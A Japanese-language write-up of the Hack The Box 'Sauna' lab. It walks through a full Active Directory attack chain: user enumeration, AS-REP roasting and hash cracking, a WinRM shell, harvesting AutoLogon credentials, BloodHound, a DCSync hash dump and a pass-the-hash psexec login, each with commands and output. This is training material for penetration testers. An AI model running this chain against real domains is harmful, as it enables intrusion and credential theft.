# Sauna (Easy, Windows)

## User Own
### Nmap
まずは、nmapでスキャンします。

```
nmap -v -sC -sV -oA nmap/sauna 10.10.10.175
```

簡単にそれぞれのオプションについて説明すると

```
-v : 出力を詳細にする
-sC : デフォルトのスクリプトでスキャン。-scrip=defautと同じ。
-sV : バージョンの検出
-oA : 出力(Output)をALL。XML、スクリプトキディ出力、grep用出力をする。
```

```-oA nmap/sauna```とすることでnmapフォルダ以下に3つのnmapのスキャン結果ファイルが生成されます。


```
sauna.gnmap
sauna.nmap
sauna.xml
```

ファイルとして残しておくことで、あとで確認しやすくなりますし、ペンテストやレッドチームでは最終調査結果をレポートとして提出すると思うのでファイルとして残しておくことを癖にしておくことは良いと思います。


nmapの実行結果の一部は以下のようになります。

```
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 3268/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
```

今回はHack The Boxのマシンのページで対象のサーバーがWindowsであることがわかっていますが、

```
88 : kerberos
445 : SMB
636 : 暗号化されたLDAP
```

これらのOpen Portからも対象のサーバーがWindowsの可能性が高いとわかります。


### crackmapexec


CrackMapExec (CME) は、Active Direcotryへの自動セキュリティアセスメントツール(post-exploitation)で、できるだけIDS/IPSに検知されないように設計されたもののようです。

内部でImpacket, PowerSploit, Mimikittenzなどのツールが使われているようです。


https://mpgn.gitbook.io/crackmapexec/


```
# crackmapexec smb 10.10.10.175 --shares -u '' -p ''
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICALBANK) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICALBANK\: STATUS_ACCESS_DENIED 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

username, password共に空なので当然ですが```STATUS_ACCESS_DENIED```となり上手くいきません。

しかし、```(name:SAUNA) (domain:EGOTISTICALBANK) (signing:True) (SMBv1:False)```という情報は得られました。


### smbmap

crackmapexec以外のツールでも確認してみます。

smbmapはドメイン全体のsambaの共有ドライブの列挙ができるものです。

```
# smbmap -H 10.10.10.175 -u '' -p ''
[+] IP: 10.10.10.175:445        Name: 10.10.10.175 
```

smbmapでもcrackmapexecで得られたこと以上の情報は得られません。


### ウェブページ確認

次にウェブページを確認します。

nmapで80番ポートがOPENだったのでアクセスできるはずです。

```10.10.10.175```にアクセスするとページへアクセスできます。

#### ソースの確認
ウェブページのソースを確認してみます。

Ctrl+Uでソースの確認ができます。

ソースを確認することでどんなCMS (WordPressやDrulpal)が使われているか特定できることがあります。

今回は特に気になるCMSは使われていなそうです。

#### 拡張子の確認

```10.10.10.175/index.html```, ```10.10.10.175/index.php```, ```10.10.10.175/index.asp```, ```10.10.10.175/index.aspx```のように拡張子を変えてアクセスすることで内部がPHPで動いているのか、ASPが使われているのか推測することができます。

今回は```.html```しかアクセスできませんでした。

#### ユーザー名候補一覧の収集、作成 (Vim レコーディング機能)

ウェブページにはどんな人たちが開発に関わっているのか推測できる情報が載っている場合があります。

今回の場合ではabout usのページに提供サービスに関わる人たちのフルネームが掲載されているます。

この情報からサーバーで利用されているユーザー名の候補一覧を作成することができます。

Vimで名前をコピペします。

しかし、このままの形でユーザー名が登録されているかはわかりません。
Fergus Smithであれば、F.Smithという形で登録することもありますし、FSmithやFergus.Smithなどいくつかよく登録されれるパターンが考えられます。

そこでこれらのパターンを網羅するようにユーザー名候補一覧を追加していきます。

ここではVimのレコーディング機能を使って効率良く候補一覧を作成します。

Vimではノーマルモード時に```qa```を押すことでその後の操作のレコーディングを行うことができます。

左下に```recording```と書かれている間操作を記録し、ノーマルモード時に```q```を押すとレコードが終了となります。

このレコーディング機能を使って一行目のFergus SmithをFergus.Smith, FSmith, Fergus.Smithに変更し、その以降のものに関しては記録したものを```@a```で再現することができるのでそれを使って複製していきます。

```5@a```とすることで5回同じ処理を繰り返すことができますので一度にユーザー名候補を作成することができます。

これらの候補一覧に加えて、Windowsアカウントで使われる```administrator```と```guest```を追加しておきます。

### kerbrute

ユーザー名候補一覧が作成できたら、Active Directoryのアカウントに対してブルートフォースができる[kerbrute](https://github.com/ropnop/kerbrute)を使います。


余談ですが、kerbruteはGo言語で書かれており、セキュリティのツールはPythonが多いイメージがあるが最近はGoも見る気がしています。

releasesから実行ファイルをダウンロードして利用します。

chmodして、先ほど作成したユーザー名候補一覧```users.txt```を引数に入れます。

```
# chmod +x kerbrute_linux_amd64
# ./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICALBANK users.txt
```

実行結果をみると、```administrator```と```FSmith```がヒットしました。

```
2020/08/15 03:03:49 >  [+] VALID USERNAME:       administrator@EGOTISTICALBANK                                                          
2020/08/15 03:03:49 >  [+] VALID USERNAME:       FSmith@EGOTISTICALBANK                                                                 
2020/08/15 03:03:49 >  Done! Tested 26 usernames (2 valid) in 0.747 seconds
```

### /etc/hostsの設定

次にやることの前準備として```/etc/hosts```の設定を行います。

```/etc/hosts```でIPアドレスとそれに対応するホスト名を設定することができます。

以下のように一行に複数のホスト名を列挙して設定することもできます。

```
10.10.10.175    EGOTISTICALBANK sauna sauna.EGOTISTICALBANK
```

### GetNPUsers

[Impacket](https://github.com/SecureAuthCorp/impacket)というネットワークプロトコルを操作するためのもので、examples以下に色々な使い勝手の良いスクリプトが用意されています。

[GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)は、Impacketのexamplesの中の一つで、Kerberos認証で使われるTGT(Ticket Granting Ticket)を取得することができます。

kaliでは既にimpacketがインストールされているのでそちらを使います。

```locate GetNPUsers```でどこにあるのか確認することができます。


```
# python3 GetNPUsers.py EGOTISTICALBANK/fsmith
```

実行結果

```
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICALBANK:c932696d721341ea6010068a314f5239$f297602f9d43f04534e0a4cf7f4589ad9469c483ed5a331375fe035555c37acdf6d6211bdfaa7f165324979ab3d4240b05e391143f4e026138ecbaaede6b7fab1472dc29e3ae7d8bd703f320885391801f48686a2a197268c16bfc85a6ccf973583c64884a0738fbedbb427360730203fd05eae6fe78a0f8486cdffa0e0d64853d9cb94592ce3dc88a1ed8fa12bf65478a07d144ca6d733dc1a2077ce1ac58a2a39f393f6877b6995c6725be8c540b92095b56035ef5e7101ae2ae5a3c8c147bc810221b269a4596fb2a84099b0bba05d1b57e0f37b142c520fd4d5cabbbcb6f97e588b475fc1c343f9f1782a5347796d72e9db7a84dc5d7f3
```

TGTを取得することができました！

### hashcat

TGTを取得することができたら次にパスワードを推測します。

TGTにはパスワードハッシュが含まれているのでhashcatを使うことでパスワードを特定することができます。

hashcatはMD4, MD5, SHA1など多くのタイプのハッシュからパスワードを復元することができます。

そのため、どのタイプのハッシュなのかもhashcatの引数(mode)として与える必要があるのでmodeが何に当たるのか確認します。


```
# hashcat --example-hashes | less
```

TGTの先頭の文字列```krb5asrep```で検索すると


```
MODE: 18200
TYPE: Kerberos 5, etype 23, AS-REP
HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
PASS: hashcat
```

modeが18200であることがわかります。

```hashcat -h```からもmodeの確認はできますが、実際に確認したいTGTの文字列から検索できるので```hashcat --example-hashes```も知っておくと便利です。

modeがわかったら実際にhashcatでクラックします。

```
# hashcat -m 18200 tgt-hash.txt /usr/share/wordlists/rockyou.txt
```
(tgt-hash.txtに先ほど取得したTGTを保存しています)

hashcatでは利用するパスワードリストも指定する必要がありますが、kaliで標準でインストールされている```/usr/share/wordlists/rockyou.txt```を利用することが良いと思います。

実行するとして以下のように```Cracked```となり、```Thestrokes23```がパスワードだとわかりました！


```
$krb5asrep$23$fsmith@EGOTISTICALBANK:c932696d721341ea6010068a314f5239$f297602f9d43f04534e0a4cf7f4589ad9469c483ed5a331375fe035555c37acdf6d6211bdfaa7f165324979ab3d4240b05e391143f4e026138ecbaaede6b7fab1472dc29e3ae7d8bd703f320885391801f48686a2a197268c16bfc85a6ccf973583c64884a0738fbedbb427360730203fd05eae6fe78a0f8486cdffa0e0d64853d9cb94592ce3dc88a1ed8fa12bf65478a07d144ca6d733dc1a2077ce1ac58a2a39f393f6877b6995c6725be8c540b92095b56035ef5e7101ae2ae5a3c8c147bc810221b269a4596fb2a84099b0bba05d1b57e0f37b142c520fd4d5cabbbcb6f97e588b475fc1c343f9f1782a5347796d72e9db7a84dc5d7f3:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
```


### evil-winrm

ユーザー名、パスワード共にわかったので今度は[evil-winrm](https://github.com/Hackplayers/evil-winrm)を使ってシェルの獲得を試みます。

WinRM (Windows Remote Management)が有効になっている場合にはシェルが獲得できる可能性があります。

まずはインストールします。

evil-winrmはRubyなのでgemを使ってインストールできます。


```
# gem install evil-winrm
```

その後、ユーザー名、パスワードを引数に与えて実行します。

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

結果
```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

シェル獲得成功です！

あとは、Desktopに移動してuser.txtを開けばUser Own完了です。

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> Get-Content user.txt
1b5520b98d97cf17f24122a55baf70cf
```

## Root Own

一般ユーザーのアカウントを獲得できたあとは、管理者ユーザーへ権限の昇格を目指します。

### winPEAS

Windowsの権限昇格のための便利ツールとして[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)があります。

winPEASは一般ユーザーでwinPEASを実行することで権限昇格のために役立ちそうな情報を収集し、重要な情報を赤色で表示してくれるものです。

あくまで情報を集めて表示してくれるものなのでこれを実行すれば自動で管理者権限が取れるというものではありません。

まずは、シェルを獲得できたユーザー上で実行する実行ファイルをダウンロードします。

Githubの[privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)を丸ごとダウンロードして、```winPEAS/winPEASexe/winPEAS/bin/Release/```の中にある```winPEAS.exe```を使います。

privilege-escalation-awesome-scripts-suiteにはwinPEAS以外にもlinPEASというLinux用のスクリプトも提供しています。

winPEAS.exeがあるディレクトリ内でevil-winrmでログインしてアップロードします。

```
Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEAS.exe
```

アップロードが完了したら実行します。

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEAS.exe
```

実行するとかなり大量の結果が出力されます。

以下のように重要な部分は赤色で表示されますのでその部分を重点的に確認していきます。

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

するとこのように```Some AutoLogon credentials were found!!```という興味深いものが発見できることがあります。

ここでは```svc_loanmanager```というアカウントの自動ログインのパスワード```Moneymakestheworldgoround!```が発見できました。

### Bloodhound

winPEASでsvc_loanmanagerのパスワードまでは発見できたのですが、管理者権限のアカウントまでは繋がりませんでした。

このような時に使えるのが[Bloodbound](https://github.com/BloodHoundAD/BloodHound)です。

BloodhoundではActive Directoryの権限の関係をグラフ化し、どのアカウントから管理者権限を取れるのかを明らかにしてくれるツールです。

詳しくは@v_avengerさんの以下の記事が参考になります。

https://qiita.com/v_avenger/items/56ef4ae521af6579c058

また、レッドチーム実践ガイドをお持ちの方は4.8 Windowsドメイン環境を乗っ取る 3. Bloodhound / Sharphound (P.163)にも詳しく書かれています。

まずはインストールします。

```
# apt install -y bloodhound
```

neo4jも必要なので起動させます。

```
# neo4j console
```

```http://localhost:7474/browser/```へアクセスして初期設定としてパスワードの変更を行います。

(変更後のパスワードはこの後Bloodhoundで利用します)

Bloodhoundを起動します。

```
# bloodhound 
```

ログイン画面が出てきますのでユーザー名、変更後のパスワードを入力します。

真っ白いキャンバスが出てきたらOKです。

次にWindowsサーバー上でBloodhoundのIngestorを実行し、Active Directoryのユーザー、グループ、ホストの情報を収集させます。

Ingestorは[GithubのBloodhound](https://github.com/BloodHoundAD/BloodHound)のIngestor以下にあるSharpHound.exeを使います。

こちらをwinPEASと同様にWindowsサーバーにアップロードして実行します。

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload SharpHound.exe

*Evil-WinRM* PS C:\Users\FSmith\Documents> ./SharpHound.exe
```

実行すると以下のようなzipファイルが生成されます。

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir


    Directory: C:\Users\FSmith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/16/2020   9:00 AM           9114 20200816090054_BloodHound.zip
```

こちらを今度はkali側にダウンロードします。

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20200816090054_BloodHound.zip
```

ダウンロードしたファイルを先ほどのBloodhoundに読み込ませます。

ファイルをドラッグ&ドロップさせればできます。

次に自分が現在アクセスできるユーザーを登録していきます。

現在、fsmithとsvc_loanmanagerのアカウントは獲得できているのでその設定を行います。

左上の検索窓にfsmithやsvc_loanmanagerを入力するとサジェストされるのでクリックします。

そうするとアイコンが表示されます。

そのアイコン右クリックして表示されるメニューから```Mark User as Owned```を選択し、自分が権限を獲得できていることをマークしていきます。

(マークするとドクロマークが付きます)

左上のマークを押して、Queriesの```Find Shortest Paths to Domain Admins```をクリックするとAdminまでの最短パスを確認できます。

しかし、このパス上には既に獲得したアカウントはないため直接Adminになることはできないようです。

次に```Find Principals with DCSync Rights```をクリックします。

すると右下にドクロマークの付いたアイコンがあり、DCSyncを使うとAdminまで辿り着けどうな感じがします。

DCSyncとは何かというと、Administratorなどのドメイン内のユーザーのハッシュを取得するためにドメインコントローラーになりすましをするというものだそうです。

DCSyncを実行するためにはドメイン管理者、Domain Controllersグループのメンバーなどである必要があり、今回svc_loanmgrが「Find Principals with DCSync Rights」で表示されたのでまさにDCSyncを実行できるユーザーであることがわかりました。

DCSnycについてもレッドチーム実践ガイドの4.9 ドメインコントローラのハッシュをダンプする (P.185)に書かれています。

### secretsdump

Bloodhoundの結果、svc_loanmgrでDCSnycでAdminまで辿り着けそうだとわかりました。

次に実際にAdminのハッシュを獲得するために[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)を使います。

secretsdumpもGetNPUsersと同様にImpacketのexampleの中にあるもので、色々な方法を使ってハッシュのダンプを取得してくれます。

```locate secretsdump```で場所を確認し、svc_loanmgrで実行します。

```
# python3 secretsdump.py EGOTISTICALBANK/svc_loanmgr@10.10.10.175
```

パスワードを求められるのでwinPEASで発見した```Moneymakestheworldgoround!```を入力します。

結果
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:57b0c872972fd21d593b99a50fd6dcd1:::
```

Administratorのハッシュを獲得できました！

### psexec

secretsdumpでAdministratorのハッシュが獲得できたのでこのハッシュを使ってAdminにアクセスできれば完了です。

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)はWindows Sysinternalsでも公開されているWindowsをリモートからアクセスするためのツールです。

こちらもsecretsdump、GetNPUsersと同様にImpacketのexampleの中で用意されているものがあるのでこちらを利用します。

```locate psexec```で場所を確認し、administratorで実行します。

```
# python3 psexec.py EGOTISTICALBANK/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
```

実行するとWindowsのコマンドプロンプトのシェルが取れます。

```
C:\Windows\system32>
```

あとはadministratorのデスクトップに置かれたファイルを確認するだけです！

```
C:\Windows\System32>cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop>type root.txt
f3ee04965c68257382e31502cc5e881f
```

Root Own!
